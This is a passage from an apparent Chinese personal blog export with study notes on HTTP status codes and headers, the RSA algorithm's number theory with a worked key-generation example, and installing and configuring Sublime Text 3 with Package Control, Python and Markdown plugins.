<td>Informational(信息性状态码）</td>
<td>接收的请求正在处理</td>
</tr>
<tr>
<td>2XX</td>
<td>Success（成功状态码）</td>
<td>请求正常处理完毕</td>
</tr>
<tr>
<td>3XX</td>
<td>Redirection（重定向状态码）</td>
<td>需要进行附加操作以完成请求</td>
</tr>
<tr>
<td>4XX</td>
<td>Client Error（客户端错误状态码）</td>
<td>服务器无法处理请求</td>
</tr>
<tr>
<td>5XX</td>
<td>Server Error（服务器错误状态码）</td>
<td>服务器处理请求出错</td>
</tr>
</tbody>
</table>
</div>
<h4 id="3XX："><a href="#3XX：" class="headerlink" title="3XX："></a>3XX：</h4><ul>
<li>301 Moved Permanently：永久重定向</li>
<li>302 Moved Temporarily：临时重定向 希望用户（本次）能使用新的URI访问</li>
<li>303 See Other：要求用户（用GET定向获取请求的资源）</li>
<li>304 Not Modified：访问页面没有修改</li>
<li>307 Temporary Redirect：希望把POST改为GET</li>
</ul>
<h4 id="4XX："><a href="#4XX：" class="headerlink" title="4XX："></a>4XX：</h4><ul>
<li>400 Bad Request:语法错误等造成错误请求</li>
<li>401 Unauthorized：需要授权认证</li>
<li>403 Forbidden：访问权限不够</li>
<li>404 Not Found：没有找到</li>
</ul>
<h4 id="5XX："><a href="#5XX：" class="headerlink" title="5XX："></a>5XX：</h4><ul>
<li>500 Internal Server Error：服务器端执行请求发生错误</li>
<li>503 Service Unavailable：服务器暂时处于超负载或正在进行停机维护，无法处理请求</li>
</ul>
<h2 id="6-HTTP首部"><a href="#6-HTTP首部" class="headerlink" title="6.HTTP首部"></a>6.HTTP首部</h2><h4 id="HTTP报文首部："><a href="#HTTP报文首部：" class="headerlink" title="HTTP报文首部："></a>HTTP报文首部：</h4><p>通用首部字段：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cache-Control</td>
<td>控制缓存的行为</td>
<td>private,max-age=0,no-cache等</td>
</tr>
<tr>
<td>Connection</td>
<td>逐跳首部、持久连接的管理</td>
<td>Keep-Alive/close</td>
</tr>
<tr>
<td>Date</td>
<td>创建报文的日期时间</td>
<td>Tue,03 Jul 2012 04:40:59 GMT</td>
</tr>
<tr>
<td>Pragma</td>
<td>报文指令</td>
<td></td>
</tr>
<tr>
<td>Trailer</td>
<td>说明报文主体后记录了哪些字段</td>
<td></td>
</tr>
<tr>
<td>Transfer-Encoding</td>
<td>指定报文主体的传输编码方式</td>
<td>chunked等</td>
</tr>
<tr>
<td>Upgrade</td>
<td>升级为其他协议</td>
<td>是否可使用更高的版本进行通讯</td>
</tr>
<tr>
<td>Via</td>
<td>追踪客户端与服务器之间的请求和响应报文的传输路径</td>
<td></td>
</tr>
<tr>
<td>Warning</td>
<td>告知用户一些与缓存有关的警告</td>
<td>[警告码][警告的主机：端口号]“[警告内容]”([日期时间])</td>
</tr>
</tbody>
</table>
</div>
<p>请求首部字段：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept</td>
<td>用户代理可处理的<strong>媒体类型</strong></td>
<td>type/subtype形式；text/html,text/plain等</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>优先的<strong>字符集</strong></td>
<td>utf-8等</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>优先的语言</td>
<td>zh-cn等</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>优先编码内容</td>
<td>gzip等</td>
</tr>
<tr>
<td>Authorization</td>
<td>通知服务器，用户代理的认证信息</td>
<td>转码认证</td>
</tr>
<tr>
<td>Expect</td>
<td>期待服务器的特定行为</td>
<td>例：100-continue</td>
</tr>
<tr>
<td>From</td>
<td>用户的电子邮箱地址</td>
<td>例：info@hacker.jp</td>
</tr>
<tr>
<td>Host</td>
<td>请求资源所在服务器</td>
<td>必须包含；例：www.baidu.com</td>
</tr>
<tr>
<td>If-Match</td>
<td>条件请求</td>
<td>例：”123456</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>比较资源的更新时间</td>
<td></td>
</tr>
<tr>
<td>If—None-Match</td>
<td>比较实体标记（与If-Match相反）</td>
<td></td>
</tr>
<tr>
<td>If-Range</td>
<td>资源未更新时发送实体Byte的范围请求</td>
<td></td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>比较资源的更新时间（与If-Modified-Since相反）</td>
<td></td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>最大传输逐跳数</td>
<td></td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>代理服务器要求客户端的认证信息</td>
<td></td>
</tr>
<tr>
<td>Range</td>
<td>实体的字节范围要求</td>
<td></td>
</tr>
<tr>
<td>Referer</td>
<td>对请求URI的原始获取方</td>
<td></td>
</tr>
<tr>
<td>TE</td>
<td>传输编码的优先级</td>
<td></td>
</tr>
<tr>
<td>User-Agent</td>
<td>HTTP客户端程序的信息</td>
<td>系统，浏览器，ip地址</td>
</tr>
<tr>
<td>Cookie</td>
<td>服务器接收到的Cookeie信息</td>
</tr>
</tbody>
</table>
</div>
<p>响应首部字段：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept-Ranges</td>
<td>是否接受字节范围请求</td>
<td></td>
</tr>
<tr>
<td>Age</td>
<td>推算资源创建经过时间</td>
<td>例：600</td>
</tr>
<tr>
<td>ETag</td>
<td>客户端实体标示</td>
<td></td>
</tr>
<tr>
<td>Location</td>
<td>令客户端重定向至URI</td>
<td>重定向目的地</td>
</tr>
<tr>
<td>Prox-Authenticate</td>
<td>代理服务器对客户端的认证信息</td>
<td></td>
</tr>
<tr>
<td>Retry-After</td>
<td>对再次发起请求的时机要求</td>
<td></td>
</tr>
<tr>
<td>Server</td>
<td>HTTP服务器的安装信息</td>
<td>具有安全隐患</td>
</tr>
<tr>
<td>Vary</td>
<td>代理服务器缓存的管理信息</td>
<td></td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>服务器对客户端的认证信息</td>
<td>访问认证</td>
</tr>
<tr>
<td>Set-Cookie</td>
<td>开始状态管理所使用的Cookie信息</td>
<td>NAME=VALUE；expires=DATE；path=PATH；domain=域名；Secure；HttpOnly</td>
</tr>
</tbody>
</table>
</div>
<p>实体首部字段：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>Allow</td>
<td>资源可支持的HTTP方法</td>
<td>GET等</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>实体主体适用的编码方式</td>
<td>gzip等</td>
</tr>
<tr>
<td>Content-Language</td>
<td>实体主体的自然语言</td>
<td>zh-cn等</td>
</tr>
<tr>
<td>Content-Length</td>
<td>实体主体的大小（单位：字节）</td>
<td>15000等</td>
</tr>
<tr>
<td>Content-Location</td>
<td>替代对应资源的URI</td>
<td></td>
</tr>
<tr>
<td>Content-MD5</td>
<td>实体主体的报文摘要</td>
<td></td>
</tr>
<tr>
<td>Content-Range</td>
<td>实体主体的位置范围</td>
<td></td>
</tr>
<tr>
<td>Content-Type</td>
<td>实体主体的媒体类型</td>
<td></td>
</tr>
<tr>
<td>Expires</td>
<td>实体主体过期的日期时间</td>
<td></td>
</tr>
<tr>
<td>Last-Modified</td>
<td>资源的最后修改日期时间</td>
</tr>
</tbody>
</table>
</div>
<p>HTTP首部字段是由首部字段名和字段值构成的</p>
<ul>
<li>Content-Type: 报文主体对象的类型</li>
<li>Keep-Alive：</li>
</ul>
<h2 id="7-HTTPS协议简介"><a href="#7-HTTPS协议简介" class="headerlink" title="7.HTTPS协议简介"></a>7.HTTPS协议简介</h2><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><ul>
<li>通讯使用明文（不加密），内容可能会被窃听</li>
<li>不验证通信方的身份，因此有可能遭遇伪装</li>
<li>无法证明报文的完整性，所以有可能已遭篡改</li>
</ul>
<p>HTTP+加密+认证+完整性保护=HTTPS<br><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/HTTPS通讯过程.jpg" alt="图片"></p>
<h2 id="8-HTTP的认证"><a href="#8-HTTP的认证" class="headerlink" title="8.HTTP的认证"></a>8.HTTP的认证</h2><ul>
<li>BASIC认证（基本认证）</li>
<li>DIGEST认证（摘要认证）</li>
<li>SSL客户端认证</li>
<li>FormBase认证（基于表单认证）</li>
<li>Windows统一认证（Keberos认证，NTLM认证）</li>
</ul>
]]></content>
      <tags>
        <tag>HTTP协议</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA算法</title>
    <url>/2020/04/17/RSA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h2><p>1976年以前，所有的加密方法都是对称加密算法。这种算法加密和解密使用的是同一个密钥。这种模式密钥的传递很不安全。</p>
<p>1977年，两位美国计算机学家 Whitfield Diffie 和 Martin Hellman，提出了一种新的构思，可以在不传递密钥的情况下，完成解密。这被称为 <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman 密钥交换算法</a>。这个构思引出了后来的非对称加密模式。</p>
<p><img src="/2020/04/17/RSA%E7%AE%97%E6%B3%95/twoScients.png" alt="8e532e24d152a59efc7492e033e74c47.png"></p>
<span id="more"></span>
<p>1977年，三位数学家 Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。算法用他们三个人名字命名，叫RSA算法。直到现在，依旧目前最广泛使用的非对称加密算法。<br><img src="/2020/04/17/RSA%E7%AE%97%E6%B3%95/threeScients.png" alt="12e42a5376ea5c0af9ac6a8dc20a068d.png"></p>
<h2 id="算法所需知识"><a href="#算法所需知识" class="headerlink" title="算法所需知识"></a>算法所需知识</h2><h3 id="互质关系"><a href="#互质关系" class="headerlink" title="互质关系"></a>互质关系</h3><p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是<a href="https://zh.wikipedia.org/zh-cn/%E4%BA%92%E8%B3%AA">互质关系</a>.</p>
<p>关于互质可以得到以下结论：</p>
<ul>
<li>任意两个制数构成互质关系，比如13和61.</li>
<li>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，如3和10。</li>
<li>如果两个数中，较大的那个数是质数，则两者构成互质关系，如97和57。</li>
<li>1和任意一个自然数都是互质关系，如1和99。</li>
<li>p是大于1的整数，则p和p-1构成互质关系，如57和56。</li>
<li>p是大于1的奇数，则p和p-2构成互质关系，如17和15。</li>
</ul>
<h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>请思考以下问题：  </p>
<pre><code>任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？）
</code></pre><p>计算这个值的方法就是<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">欧拉函数</a>，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。</p>
<p>对于φ(n)的计算有如下方式：</p>
<ul>
<li>当n=1时，则φ(1) = 1.因为1与任何数（包括自身）都构成互质关系。</li>
<li>当n是质数，则φ(n) = n-1。因为质数与小于它的每一个数，都构成互质关系。如5与1、2、3、4都构成互质关系。</li>
<li>如果n是质数的某一次方，即n = p^k(p为质数，k为大于等于1的整数).则$\phi(p^k) = p^k-p^{k-1}$</li>
</ul>
<p>比如φ(8) = φ(2^3) = 2^3 - 2^2 = 8-4 = 4.<br> 这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1)个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。<br> 上面的式子还可以写成下面的形式：</p>
<script type="math/tex; mode=display">\phi(p^k) = p^k-p^{k-1} = p^k(1-1/p)</script><p>可以看出，上面第二条是k=1时的特例。</p>
<ul>
<li>如果n可以分解成两个互质的整数之积，n = p1 × p2，则φ(n) = φ(p1p2) = φ(p1)φ(p2) 即积的欧拉函数等于各个因子的欧拉函数之积。</li>
<li>因为任意一共大于1的正整数，都可以写成一系列质数的积。`</li>
</ul>
<script type="math/tex; mode=display">n = p_1^{k_1}p_2^{k_2}...p_r^{k_r}</script><p>根据第四点得到：</p>
<script type="math/tex; mode=display">\phi(n) = \phi(p_1^{k_1})\phi(p_2^{k_2})...\phi(p_r^{k_r})</script><p>再根据第三点结论得到：</p>
<script type="math/tex; mode=display">\phi(n) = p_1^{k_1}p_2^{k_2}...p_r^{k_r}(1-1/{p_1})(1-1/{p_2})...(1-1/{p_r})</script><p>也就等于:</p>
<script type="math/tex; mode=display">\phi(n) = n(1-1/{p_1})(1-1/{p_2})...(1-1/{p_r})</script><p>这就是欧拉函数的通用计算公式。</p>
<h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>欧拉函数的用处，在于<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA">欧拉定理</a>)。欧拉定理指，</p>
<p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p>
<script type="math/tex; mode=display">a^{\phi(n)} ≡ 1\,(mod\,\phi(n))</script><p>也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。</p>
<p>欧拉定理有一个特殊的情况。</p>
<p>假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</p>
<script type="math/tex; mode=display">a^{p-1} ≡ 1\,(mod\,p)</script><p>这就是著名的<a href="https://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86">费马小定理</a>。它是欧拉定理的特例。</p>
<h3 id="模反元素"><a href="#模反元素" class="headerlink" title="模反元素"></a>模反元素</h3><p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。</p>
<script type="math/tex; mode=display">ab ≡ 1\,(mod\,n)</script><p>欧拉定理可以用来证明模反元素必然存在。</p>
<script type="math/tex; mode=display">a^{\phi(n)} = a\times a^{\phi(n)-1} ≡ 1\,(mod\,n)</script><p>可以看到，a的 φ(n)-1 次方，就是a的模反元素。</p>
<h2 id="算法详解"><a href="#算法详解" class="headerlink" title="算法详解"></a>算法详解</h2><p>假设爱丽丝和鲍勃进行加密通信，怎么生成公钥和私钥呢？<br><img src="/2020/04/17/RSA%E7%AE%97%E6%B3%95/communicate.png" alt="61a50ac1a0ee63f955b48ce00e97fa86.png"></p>
<h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><h4 id="1-随机选择两个不想等的质数p和q"><a href="#1-随机选择两个不想等的质数p和q" class="headerlink" title="1.随机选择两个不想等的质数p和q"></a>1.随机选择两个不想等的质数p和q</h4><p>爱丽丝选择了61和53.（实际应用中，这两个质数越大，就越难破解）。</p>
<h4 id="2-计算p和q的乘积n"><a href="#2-计算p和q的乘积n" class="headerlink" title="2.计算p和q的乘积n"></a>2.计算p和q的乘积n</h4><p>爱丽丝把61和53相乘。<br>n = 61×53 = 3233</p>
<p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p>
<h4 id="3-计算n的欧拉函数φ-n"><a href="#3-计算n的欧拉函数φ-n" class="headerlink" title="3.计算n的欧拉函数φ(n)"></a>3.计算n的欧拉函数φ(n)</h4><p>根据公式：φ(n) = （p-1）（q-1）<br>算出 φ(3233) 为 3120.</p>
<h4 id="4-随机选择一个整数e，条件是1-lt-e-lt-φ-n-且e与φ-n-互质"><a href="#4-随机选择一个整数e，条件是1-lt-e-lt-φ-n-且e与φ-n-互质" class="headerlink" title="4.随机选择一个整数e，条件是1&lt;e&lt;φ(n),且e与φ(n)互质"></a>4.随机选择一个整数e，条件是1&lt;e&lt;φ(n),且e与φ(n)互质</h4><p>爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p>
<h4 id="5-计算e对于φ-n-的模反元素d"><a href="#5-计算e对于φ-n-的模反元素d" class="headerlink" title="5.计算e对于φ(n)的模反元素d"></a>5.计算e对于φ(n)的模反元素d</h4><p>所谓”模反元素”就是指有一个整数d，可以使得ed被φ(n)除的余数为1。</p>
<p>ed ≡ 1 (mod φ(n)),</p>
<p>这个式子等价于</p>
<p>ed - 1 = kφ(n)</p>
<p>于是，找到模反元素d，实质上就是对下面这个二元一次方程求解</p>
<p>ex + φ(n)y = 1<br>爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。</p>
<p>至此所有计算完成。</p>
<h4 id="讲n和e封装成公钥，n和d封装成私钥"><a href="#讲n和e封装成公钥，n和d封装成私钥" class="headerlink" title="讲n和e封装成公钥，n和d封装成私钥"></a>讲n和e封装成公钥，n和d封装成私钥</h4><p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
<p>实际应用中，公钥和私钥的数据都采用ASN.1格式表达（实例）。</p>
<h3 id="加密和解密"><a href="#加密和解密" class="headerlink" title="加密和解密"></a>加密和解密</h3><h4 id="用公钥加密"><a href="#用公钥加密" class="headerlink" title="用公钥加密"></a>用公钥加密</h4><p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
<p>可以得到以下式子c：</p>
<script type="math/tex; mode=display">{m^e} ≡ c \,(\,mod\,n)</script><h4 id="用私钥解密"><a href="#用私钥解密" class="headerlink" title="用私钥解密"></a>用私钥解密</h4><p>爱丽丝拿到鲍勃发来的密文以后，就用自己的私钥（n，d）进行解密。可以证明，下面的等式一定成立：</p>
<script type="math/tex; mode=display">c^d ≡ m\,(mod\,n)</script><p>本文参考：<a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text3 Install</title>
    <url>/2020/03/12/Sublime-Text3-Install/</url>
    <content><![CDATA[<h3 id="Sublime-Text3-一次能够安装好的教程详解。"><a href="#Sublime-Text3-一次能够安装好的教程详解。" class="headerlink" title="Sublime Text3 一次能够安装好的教程详解。"></a>Sublime Text3 一次能够安装好的教程详解。</h3><span id="more"></span>
<h3 id="Sublime-Text3-安装教程"><a href="#Sublime-Text3-安装教程" class="headerlink" title="Sublime Text3 安装教程"></a>Sublime Text3 安装教程</h3><h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><p>去官网下载：<a href="http://www.sublimetext.cn/">http://www.sublimetext.cn/</a></p>
<p><img src="/2020/03/12/Sublime-Text3-Install/Sublime01.png" alt="a48170e3051da81b40ba956fe85ac553.png"></p>
<p>用IDM会很慢，可以复制下载链接，用迅雷下载，3秒下载完毕。<br>下载完毕，双击安装。选择”Add to explorer context menu”.</p>
<h4 id="安装package-control插件"><a href="#安装package-control插件" class="headerlink" title="安装package control插件"></a>安装package control插件</h4><p>这是安装sublime的重点。</p>
<p>手动安装：<br>1 点击<br><a href="https://github.com/wbond/package_control">https://github.com/wbond/package_control</a>去github下载Package Control安装报下载到本地，下载的文件名为：<br>package_control-master.zip。解压后将文件名改为Package Control；</p>
<p>2.打开Sublime的Preferences -&gt; Browse Packages菜单，将上面改好名字的Package Control文件夹复制过去,重启就会发现package control。</p>
<p><img src="/2020/03/12/Sublime-Text3-Install/Sublime02.png" alt="be3d5a2e4efd21446517b576426ee60c.png"></p>
<p>3.但是你会发现你点击package control后Install Package不成功，There are no packages available for installation的提示。</p>
<p>失败原因为官网地址被墙，导致channel_v3文件无法访问。</p>
<p>解决方法：点击Preferences——&gt;Package Settings——&gt;Package Control——&gt;Settings - User，</p>
<p>打开配置文件添加地址：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;channels&quot;</span>:</span><br><span class="line">[<span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;https://github.com/JavenZ/channel_v3/raw/master/channel_v3.json&quot;</span></span></span><br><span class="line"><span class="meta"></span>],</span><br></pre></td></tr></table></figure>
<p>以下两个地址任选一</p>
<p>GitHub地址：<a href="https://github.com/JavenZ/channel_v3/raw/master/channel_v3.json">https://github.com/JavenZ/channel_v3/raw/master/channel_v3.json</a></p>
<p>国内地址：<a href="https://attachments-cdn.shimo.im/OykO0AIRnX0aeB4d/channel_v3.json">https://attachments-cdn.shimo.im/OykO0AIRnX0aeB4d/channel_v3.json</a></p>
<p>以上json文件引用地址由简书作者Javen_01（知乎ID孙悟菜）提供，如果地址失效可以去他的GitHub查看最新地址。</p>
<p>下载完就可以下载插件。</p>
]]></content>
      <categories>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text3 配置pyhon环境</title>
    <url>/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h3 id="Sublime-Text3-配置python环境详解。"><a href="#Sublime-Text3-配置python环境详解。" class="headerlink" title="Sublime Text3 配置python环境详解。"></a>Sublime Text3 配置python环境详解。</h3><span id="more"></span>
<h4 id="Sublime-Text3配置python环境"><a href="#Sublime-Text3配置python环境" class="headerlink" title="Sublime Text3配置python环境"></a>Sublime Text3配置python环境</h4><p>安装参考以前文章，下面说配置</p>
<p>打开安装好的 sublime text 3，选择编译环境<br><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython01.png" alt="0e3b5e9cfb36e436416f187edb061fd0.png"></p>
<p>然后输入</p>
<blockquote>
<p>print(“你好”)</p>
</blockquote>
<p>然后保存为.py后缀文件</p>
<p>回到主界面，Ctrl+B运行</p>
<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython02.png" alt="89d3fe035435cc1dc56fff80ffd225fc.png"></p>
<p>中文成功输出，证明配置好了，但还需要按一个插件来支持 input</p>
<p>安装SublimeREPL插件，使Sublime支持input</p>
<p>安装好，试着调用。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">num</span> = <span class="function"><span class="title">input</span>(<span class="string">&quot;今天几月几日:&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">num</span>)</span></span><br></pre></td></tr></table></figure>
<p>跟 Ctrl+B 直接编译不同，利用插件来编译需要先手动 Ctrl+S 保存</p>
<p><strong>常规调用：</strong></p>
<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython03.png" alt="69d5a1b9e9dfe5c1aff1d2e1e1775f36.png"></p>
<p>然后弹出一个新的框，进行输入输出。</p>
<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython04.png" alt="fbe8fc6a38764b3605c069357dafdf37.png"></p>
<p><strong>设置快捷键调用：</strong></p>
<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython05.png" alt="ded30527af9e541ca4cf0e79bf907cf2.png"></p>
<p>左边是系统默认设置，我们在右边窗口输入以下设置（另一个 Alt + End 是终止编译的快捷键），Ctrl+S 保存</p>
<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython06.png" alt="bc715187792b855d583c10db6cc44403.png"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[ </span><br><span class="line"><span class="code">    &#123; </span></span><br><span class="line"><span class="code">        &quot;keys&quot;: [&quot;f4&quot;], </span></span><br><span class="line"><span class="code">        &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;, </span></span><br><span class="line"><span class="code">        &quot;command&quot;: &quot;run_existing_windoww_command&quot;, </span></span><br><span class="line"><span class="code">        &quot;args&quot;: &#123; </span></span><br><span class="line"><span class="code">            &quot;id&quot;: &quot;repl_python_run&quot;, </span></span><br><span class="line"><span class="code">            &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;</span></span><br><span class="line"><span class="code">        &#125; </span></span><br><span class="line"><span class="code">    &#125;,</span></span><br><span class="line"><span class="code">        &#123; </span></span><br><span class="line"><span class="code">            &quot;keys&quot;: [&quot;alt+end&quot;], </span></span><br><span class="line"><span class="code">            &quot;command&quot;: &quot;exec&quot;, </span></span><br><span class="line"><span class="code">            &quot;args&quot;: &#123;&quot;kill&quot;: true&#125; </span></span><br><span class="line"><span class="code">        &#125; </span></span><br><span class="line"><span class="code">]</span></span><br></pre></td></tr></table></figure>
<p>切换不方便，可以打开两个视图：</p>
<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython07.png" alt="c33682bb046be44ffbe99139d83ea249.png"></p>
<p>本文参考：<br>链接：<a href="https://www.zhihu.com/question/22904994/answer/800236870">https://www.zhihu.com/question/22904994/answer/800236870</a></p>
]]></content>
      <categories>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text3 Markdown插件</title>
    <url>/2020/03/13/Sublime-Text3-Markdown%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="Sublime-Text3-Markdown插件推荐"><a href="#Sublime-Text3-Markdown插件推荐" class="headerlink" title="Sublime Text3 Markdown插件推荐"></a>Sublime Text3 Markdown插件推荐</h3><span id="more"></span>
<h3 id="Markdown插件安装"><a href="#Markdown插件安装" class="headerlink" title="Markdown插件安装"></a>Markdown插件安装</h3><div class="table-container">
<table>
<thead>
<tr>
<th>插件</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>MarkdownEditing</td>
<td>一个提高Sublime中Markdown编辑特性的插件</td>
</tr>
<tr>
<td>MarkdownPreview</td>
<td>Markdown转HTML，提供在浏览器中的预览功能</td>
</tr>
<tr>
<td>MarkdownLivePreview</td>
<td>提供在编辑框中实时预览的功能</td>
</tr>
<tr>
<td>LiveReload</td>
<td>一个提供md/html等文档的实时刷新预览的插件</td>
</tr>
</tbody>
</table>
</div>
<h4 id="MarkdownEditing"><a href="#MarkdownEditing" class="headerlink" title="MarkdownEditing"></a>MarkdownEditing</h4><h5 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h5><p>可以高亮显示Markdown语法还支持很多编程语言的语法高亮显示。</p>
<p><strong>特别注意</strong>：MarkdownEditing只针对 md\mdown\mmd\txt 格式文件才启用。</p>
<h5 id="效果图："><a href="#效果图：" class="headerlink" title="效果图："></a>效果图：</h5><p><img src="/2020/03/13/Sublime-Text3-Markdown%E6%8F%92%E4%BB%B6/01.png" alt="2c15bc4a4995c73ffedb34f232b4af24.png"></p>
<h4 id="安装报错解决："><a href="#安装报错解决：" class="headerlink" title="安装报错解决："></a>安装报错解决：</h4><p>报错问题<br><img src="/2020/03/13/Sublime-Text3-Markdown%E6%8F%92%E4%BB%B6/02.png" alt="65ed9cb9ead31696bfbf1192852fa61b.png"></p>
<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>./Data/Local/ 清理掉<br>Session.sublime_session<br>Auto Save Session.sublime_session</p>
<p>去Local文件夹里删除掉这两个文件，我的只有第一个，删除后重启就可以。</p>
<h4 id="MarkdownLivePreview"><a href="#MarkdownLivePreview" class="headerlink" title="MarkdownLivePreview"></a>MarkdownLivePreview</h4><h5 id="功能：-1"><a href="#功能：-1" class="headerlink" title="功能："></a>功能：</h5><p>实时预览Markdown文件，左侧为md文件，右侧为预览结果。</p>
<h5 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h5><p>MarkdownLivePreview默认关闭实时预览，既然安装这个插件了，那肯定是要用的。打开方式为在Preferences -&gt; Package Settings -&gt; MarkdownLivePreview -&gt; Settings 的设置的右侧加一条 “markdown_live_preview_on_open”: true,，重启sublime即可。</p>
<p>为什么不能直接将左侧对应的false改为true，这是因为左侧为默认配置，是不能改的（只读），右侧的编辑区才是用户自定义区。</p>
<h5 id="效果图：-1"><a href="#效果图：-1" class="headerlink" title="效果图："></a>效果图：</h5><p><img src="/2020/03/13/Sublime-Text3-Markdown%E6%8F%92%E4%BB%B6/03.png" alt="219e1ca6d2f5d2d1ac54fa50e086acb3.png"></p>
<p>但是预览效果并不是很好，不能横向滚动。推荐下面插件。</p>
<h5 id="MarkdownPreview"><a href="#MarkdownPreview" class="headerlink" title="MarkdownPreview"></a>MarkdownPreview</h5><h6 id="将md文件用浏览器预览——1-常规方法"><a href="#将md文件用浏览器预览——1-常规方法" class="headerlink" title="将md文件用浏览器预览——1.常规方法"></a>将md文件用浏览器预览——1.常规方法</h6><p>1 组合键 Ctrl+Shift+P 调出命令面板</p>
<p>2 输入mdp找到并选中Markdown Preview： Preview in Browser</p>
